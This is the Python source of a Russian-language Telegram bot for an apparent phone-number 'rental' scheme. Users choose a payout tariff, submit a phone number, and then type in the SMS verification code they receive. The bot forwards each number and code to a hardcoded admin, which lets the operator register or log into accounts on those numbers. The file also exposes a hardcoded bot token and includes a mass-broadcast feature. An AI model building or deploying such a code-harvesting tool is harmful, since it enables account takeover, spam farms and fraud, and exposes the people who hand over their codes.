import asyncio
import logging
import aiosqlite
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# --- КОНФИГУРАЦИЯ ---
TOKEN = "8220500651:AAHKBf-AZ3UT7kH1oOrEEl-NwDWSE4DYoWw" 
ADMIN_ID = 7323981601 
CHANNEL_LINK = "https://t.me/+4K_4dildrI82ODY6"  # Ссылка приглашение в приватный канал
CHANNEL_ID = -1003532318157 # ВАЖНО: ID канала (должен начинаться с -100)

# --- НАСТРОЙКА ЛОГОВ И БОТА ---
logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# --- СОСТОЯНИЯ (FSM) ---
class RentState(StatesGroup):
    choosing_tariff = State()
    entering_number = State()
    entering_code = State()
    broadcasting = State()

# --- КЛАВИАТУРЫ ---
def main_kb():
    kb = [
        [KeyboardButton(text="📱 Сдать номер"), KeyboardButton(text="📩 Отправить код")],
        [KeyboardButton(text="📢 Канал/Чат")]
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def tariff_kb():
    kb = [
        [KeyboardButton(text="1.5$ Рег Момент")],
        [KeyboardButton(text="2.5$ Вбх вечер")],
        [KeyboardButton(text="🔙 Отмена")]
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def cancel_kb():
    return ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔙 Отмена")]], resize_keyboard=True)

# Клавиатура для проверки подписки
def sub_check_kb():
    kb = [
        [InlineKeyboardButton(text="👉 Перейти в канал", url=CHANNEL_LINK)],
        [InlineKeyboardButton(text="✅ Я подписался", callback_data="check_sub")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

# --- БАЗА ДАННЫХ ---
async def init_db():
    async with aiosqlite.connect('users.db') as db:
        await db.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
        await db.commit()

async def add_user(user_id):
    async with aiosqlite.connect('users.db') as db:
        await db.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
        await db.commit()

async def get_all_users():
    async with aiosqlite.connect('users.db') as db:
        async with db.execute('SELECT user_id FROM users') as cursor:
            return [row[0] for row in await cursor.fetchall()]

# --- ФУНКЦИЯ ПРОВЕРКИ ПОДПИСКИ ---
async def is_subscribed(user_id):
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        # Статусы, при которых доступ разрешен
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"Ошибка проверки подписки: {e}")
        # Если бот не админ или канала не существует, лучше вернуть True, чтобы не блокировать всех
        return True 

# --- ХЕНДЛЕРЫ ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await add_user(message.from_user.id)
    
    # Проверка подписки
    if not await is_subscribed(message.from_user.id):
        await message.answer(
            "🔒 <b>Доступ закрыт!</b>\n\nДля использования бота вы должны быть подписаны на наш канал.",
            reply_markup=sub_check_kb(),
            parse_mode="HTML"
        )
        return

    await message.answer(
        "👋 Привет! Добро пожаловать.\nВыберите действие в меню ниже:",
        reply_markup=main_kb()
    )

# Хендлер для кнопки "Я подписался"
@dp.callback_query(F.data == "check_sub")
async def check_sub_callback(callback: CallbackQuery):
    if await is_subscribed(callback.from_user.id):
        await callback.message.delete() # Удаляем сообщение с просьбой подписаться
        await callback.message.answer(
            "✅ Спасибо за подписку! Меню открыто.",
            reply_markup=main_kb()
        )
    else:
        await callback.answer("❌ Вы все еще не подписаны!", show_alert=True)

# 1. Нажатие на "Канал/Чат"
@dp.message(F.text == "📢 Канал/Чат")
async def show_channel(message: types.Message):
    inline_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Перейти в канал", url=CHANNEL_LINK)]
    ])
    await message.answer("Вот ссылка на наш чат/канал:", reply_markup=inline_kb)

# 2. Начало сдачи номера (ТОЖЕ ПРОВЕРЯЕМ ПОДПИСКУ)
@dp.message(F.text == "📱 Сдать номер")
async def start_rent(message: types.Message, state: FSMContext):
    # Двойная проверка (вдруг отписался)
    if not await is_subscribed(message.from_user.id):
         await message.answer("🔒 Подпишитесь на канал, чтобы продолжить.", reply_markup=sub_check_kb())
         return

    await state.set_state(RentState.choosing_tariff)
    await message.answer("Выберите тариф оплаты:", reply_markup=tariff_kb())

# 3. Выбор тарифа и запрос номера
@dp.message(RentState.choosing_tariff)
async def process_tariff(message: types.Message, state: FSMContext):
    if message.text == "🔙 Отмена":
        await state.clear()
        await message.answer("Отменено.", reply_markup=main_kb())
        return

    if message.text not in ["1.5$ Рег Момент", "2.5$ Вбх вечер"]:
        await message.answer("Пожалуйста, выберите тариф кнопкой.")
        return

    await state.update_data(tariff=message.text)
    await state.set_state(RentState.entering_number)
    await message.answer(
        f"Вы выбрали: {message.text}.\n\n✍️ Введите номер телефона (с кодом страны):",
        reply_markup=cancel_kb()
    )

# 4. Получение номера и отправка админу
@dp.message(RentState.entering_number)
async def process_number(message: types.Message, state: FSMContext):
    if message.text == "🔙 Отмена":
        await state.clear()
        await message.answer("Отменено.", reply_markup=main_kb())
        return

    data = await state.get_data()
    tariff = data.get("tariff")
    phone = message.text
    user_link = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>"

    await bot.send_message(
        ADMIN_ID,
        f"🔔 <b>Новая заявка!</b>\n\n"
        f"👤 От: {user_link} (ID: {message.from_user.id})\n"
        f"💰 Тариф: {tariff}\n"
        f"📱 Номер: <code>{phone}</code>",
        parse_mode="HTML"
    )

    await state.clear()
    await message.answer(
        "✅ Заявка принята! Ожидайте, когда я запрошу код.\n"
        "Когда код придет, нажмите кнопку '📩 Отправить код' в главном меню.",
        reply_markup=main_kb()
    )

# 5. Кнопка отправки кода
@dp.message(F.text == "📩 Отправить код")
async def ask_for_code(message: types.Message, state: FSMContext):
    # Тоже проверяем подписку
    if not await is_subscribed(message.from_user.id):
         await message.answer("🔒 Подпишитесь на канал, чтобы продолжить.", reply_markup=sub_check_kb())
         return

    await state.set_state(RentState.entering_code)
    await message.answer("✍️ Введите код из SMS:", reply_markup=cancel_kb())

# 6. Получение кода и отправка админу
@dp.message(RentState.entering_code)
async def process_code(message: types.Message, state: FSMContext):
    if message.text == "🔙 Отмена":
        await state.clear()
        await message.answer("Отменено.", reply_markup=main_kb())
        return

    code = message.text
    user_link = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>"

    await bot.send_message(
        ADMIN_ID,
        f"🔑 <b>Пришел КОД!</b>\n\n"
        f"👤 От: {user_link}\n"
        f"💬 Код: <code>{code}</code>",
        parse_mode="HTML"
    )

    await state.clear()
    await message.answer("✅ Код отправлен администратору!", reply_markup=main_kb())

# --- АДМИНСКАЯ РАССЫЛКА ---
@dp.message(Command("sendall"))
async def start_broadcast(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await state.set_state(RentState.broadcasting)
    await message.answer("Введите текст или перешлите сообщение для рассылки (или напишите 'отмена'):")

@dp.message(RentState.broadcasting)
async def do_broadcast(message: types.Message, state: FSMContext):
    if message.text and message.text.lower() == 'отмена':
        await state.clear()
        await message.answer("Рассылка отменена.")
        return

    users = await get_all_users()
    count = 0
    await message.answer(f"Начинаю рассылку на {len(users)} пользователей...")

    for user_id in users:
        try:
            await message.copy_to(chat_id=user_id)
            count += 1
            await asyncio.sleep(0.05) 
        except Exception:
            pass 

    await state.clear()
    await message.answer(f"✅ Рассылка завершена. Успешно отправлено: {count} пользователям.")

# --- ЗАПУСК ---
async def main():
    await init_db()
    # Удаляем старые апдейты, чтобы бот не отвечал на старые сообщения при запуске
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот выключен")
